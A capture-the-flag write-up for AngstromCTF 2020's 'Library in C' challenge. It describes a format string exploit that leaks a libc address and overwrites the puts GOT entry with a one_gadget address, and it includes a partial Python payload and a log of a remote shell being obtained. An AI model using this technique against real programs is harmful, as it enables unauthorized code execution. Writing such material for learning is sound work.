# Library In C

Now this was fun , the objective here is to override an entry in the Global Offset Table with something that can get us a shell.
Luckily `one_gadget` does exactly that..!

So, we overwrite the GOT entry for puts with that of `one_gadget` .
Since we have two printf's we can use one to leak a libc address and the other to overwrite the GOT


## Leaking Libc
```C
Welcome to the LIBrary in C!
What is your name?
%27$p
Why hello there 0x7ffff7ddf1e3

```
Since we get a libc address we can calculate the offset to the `one_gadget`

## Overwriting Global Offset Table

We can use 2 seperate writes to overwrite the GOT entry 
```python
a = '0x'+str(one_gadget)[10::]
print a
b = '0x'+str(one_gadget)[8:10]
print b

payload2=''
payload2+= "%{}d".format(int(a,16))
payload2+= "%22$hn"
payload2+= "%{}d".format(int(b,16)+0x96)
payload2+= "%23$hhn"
payload2 = pad(payload2)
payload2+= p64(puts_got)
payload2+= p64(puts_got+2)
```

## Running the exploit
```console
arch3r@1nv4d3r:~/git-repos/CTF-Writeups/AngstromCTF2020/Library_in_C$ python exploit.py remote 
[+] Opening connection to shell.actf.co on port 20201: Done
0x7fd0c353e830

[*] libc_base : 0x7fd0c351e000
[*] one_gadget : 0x7fd0c356326a
0x326a
0x56
[*] Switching to interactive mode
Your cart:
 - 
 -
 -
 $ ls
 flag.txt
 library_in_c 
 library_in_c.c
  

 ```
 
 We have a shell.. :D
